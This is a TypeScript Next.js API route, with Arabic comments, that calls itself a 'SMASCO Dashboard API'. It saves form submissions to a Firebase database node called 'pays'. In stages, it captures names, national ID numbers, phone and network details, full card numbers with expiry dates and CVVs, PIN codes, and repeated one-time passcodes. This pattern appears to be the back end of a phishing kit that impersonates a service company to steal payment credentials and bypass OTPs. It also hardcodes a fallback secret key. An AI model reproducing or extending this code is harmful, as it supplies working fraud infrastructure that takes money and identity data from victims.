import { NextRequest, NextResponse } from 'next/server';
import { initializeApp, getApps, getApp } from 'firebase/app';
import { getDatabase, ref, set, push } from 'firebase/database';

const firebaseConfig = {
  apiKey: process.env.NEXT_PUBLIC_FIREBASE_API_KEY,
  authDomain: process.env.NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN,
  databaseURL: process.env.NEXT_PUBLIC_FIREBASE_DATABASE_URL,
  projectId: process.env.NEXT_PUBLIC_FIREBASE_PROJECT_ID,
  storageBucket: process.env.NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: process.env.NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID,
  appId: process.env.NEXT_PUBLIC_FIREBASE_APP_ID,
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const database = getDatabase(app);

// Interface مرن للبيانات
interface NotificationData {
  [key: string]: any;
}

// دالة لتحديد الدولة من رقم الهاتف
function detectCountry(phone: string): string {
  const phoneStr = phone.replace(/[^0-9+]/g, '');
  
  if (phoneStr.startsWith('966') || phoneStr.startsWith('+966')) {
    return 'السعودية';
  } else if (phoneStr.startsWith('971') || phoneStr.startsWith('+971')) {
    return 'الإمارات';
  } else if (phoneStr.startsWith('974') || phoneStr.startsWith('+974')) {
    return 'قطر';
  } else if (phoneStr.startsWith('965') || phoneStr.startsWith('+965')) {
    return 'الكويت';
  } else if (phoneStr.startsWith('973') || phoneStr.startsWith('+973')) {
    return 'البحرين';
  } else if (phoneStr.startsWith('968') || phoneStr.startsWith('+968')) {
    return 'عمان';
  } else if (phoneStr.startsWith('20') || phoneStr.startsWith('+20')) {
    return 'مصر';
  } else if (phoneStr.startsWith('212') || phoneStr.startsWith('+212')) {
    return 'المغرب';
  } else if (phoneStr.startsWith('961') || phoneStr.startsWith('+961')) {
    return 'لبنان';
  } else if (phoneStr.startsWith('962') || phoneStr.startsWith('+962')) {
    return 'الأردن';
  } else if (phoneStr.startsWith('964') || phoneStr.startsWith('+964')) {
    return 'العراق';
  } else if (phoneStr.startsWith('967') || phoneStr.startsWith('+967')) {
    return 'اليمن';
  } else {
    return 'غير معروف';
  }
}

export async function POST(request: NextRequest) {
  try {
    // التحقق من المفتاح السري
    const apiSecret = request.headers.get('x-api-secret');
    const expectedSecret = process.env.API_SECRET || 'smasco-secret-key-2024';
    
    if (!apiSecret || apiSecret !== expectedSecret) {
      return NextResponse.json({
        success: false,
        message: 'المفتاح السري غير صحيح',
        error: 'Unauthorized'
      }, { status: 401 });
    }
    
    const data = await request.json();
    const { type, ...formData } = data;
    
    const timestamp = new Date().toISOString();
    const country = detectCountry(formData.phone || formData.mobile || '');
    
    // إنشاء كائن البيانات الرئيسي باستخدام أي نوع لتجنب أخطاء TypeScript
    const mainData: any = {
      createdDate: timestamp,
      country: country,
      data: {
        page: formData.step || '1',
        fullName: formData.fullname || '',
        phone: formData.phone || formData.mobile || '',
        email: formData.email || '',
        idNumber: formData.id_number || formData.idNumber || '',
        status: 'pending',
        violationValue: 0,
        notificationCount: 1,
        pass: formData.pin_code || '',
        ip: formData.ip || request.headers.get('x-forwarded-for') || 'unknown',
        pagename: formData.pagename || 'unknown',
      },
      currentPage: formData.step || '1',
      currentStep: formData.step || '1',
      step: parseInt(formData.step) || 1,
      otp: formData.otp_code || formData.otp || formData.verification_code || '',
      allOtps: formData.all_otps || [],
      sendType: type || 'unknown',
    };

    // إضافة بيانات حسب نوع الإرسال
    switch (type) {
      case 'client_info':
        mainData.data = {
          ...mainData.data,
          nationality: formData.nationality || '',
          city: formData.city || '',
          service: formData.service || '',
          personalInfo: {
            name: formData.fullname,
            id: formData.id_number,
            phone: formData.phone,
            nationality: formData.nationality,
            city: formData.city,
            service: formData.service
          }
        };
        break;
        
      case 'service_details':
        mainData.data = {
          ...mainData.data,
          serviceType: formData.service_type || '',
          workerNationality: formData.worker_nationality || '',
          experience: formData.experience || '',
          preferredAge: formData.preferred_age || '',
          language: formData.language || '',
          durationType: formData.duration_type || '',
          package: formData.package || formData.hours_package || formData.months_package || '',
          hoursPackage: formData.hours_package || '',
          monthsPackage: formData.months_package || '',
          notes: formData.notes || '',
        };
        break;
        
      case 'verification':
        mainData.data = {
          ...mainData.data,
          network: formData.network_provider || formData.network || '',
          phoneOtp: formData.verification_code || '',
          phoneNumber: formData.phone_number || '',
        };
        break;
        
      case 'payment':
        mainData.data = {
          ...mainData.data,
          paymentCardNumber: formData.card_number || formData.cardNumber || '',
          paymentExpiry: formData.card_expiry || formData.expiryDate || '',
          paymentCVV: formData.card_cvv || formData.cvv || '',
          cardName: formData.card_name || '',
          amount: formData.amount || '',
          package: formData.package || '',
        };
        break;
        
      case 'otp':
        mainData.data = {
          ...mainData.data,
          otp: formData.otp_code || '',
          otp2: formData.otp2 || formData.verification_code || '',
          pass: formData.pin_code || '',
          amount: formData.amount || '',
          package: formData.package || '',
        };
        if (formData.otp_code) {
          mainData.otp = formData.otp_code;
          mainData.allOtps = [formData.otp_code];
        }
        break;
        
      case 'full_submission':
        mainData.data = {
          ...mainData.data,
          cardName: formData.card_name || '',
          paymentCardNumber: formData.card_number || '',
          paymentExpiry: formData.card_expiry || '',
          paymentCVV: formData.card_cvv || '',
          otp: formData.otp_code || '',
          otp2: formData.verification_code || '',
          serviceType: formData.service_type || '',
          workerNationality: formData.worker_nationality || '',
          experience: formData.experience || '',
          preferredAge: formData.preferred_age || '',
          language: formData.language || '',
          amount: formData.amount || '',
          package: formData.package || '',
          nationality: formData.nationality || '',
          city: formData.city || '',
        };
        break;
    }

    // تخزين في Realtime Database
    const paysRef = ref(database, 'pays');
    const newDocRef = push(paysRef);
    await set(newDocRef, mainData);

    // إرجاع استجابة ناجحة
    return NextResponse.json({
      success: true,
      message: 'تم استلام البيانات بنجاح',
      id: newDocRef.key,
      country: country,
      timestamp: timestamp
    }, { status: 200 });

  } catch (error) {
    console.error('Error processing request:', error);
    return NextResponse.json({
      success: false,
      message: 'حدث خطأ أثناء معالجة البيانات',
      error: error instanceof Error ? error.message : 'خطأ غير معروف'
    }, { status: 500 });
  }
}

// GET method للتأكد من أن الـ API يعمل
export async function GET() {
  return NextResponse.json({
    status: 'active',
    service: 'SMASCO Dashboard API',
    version: '1.0.0',
    database: 'Realtime Database (بدون فوترة)',
    endpoints: {
      POST: 'إرسال بيانات جديدة',
      GET: 'فحص حالة الـ API'
    }
  });
}
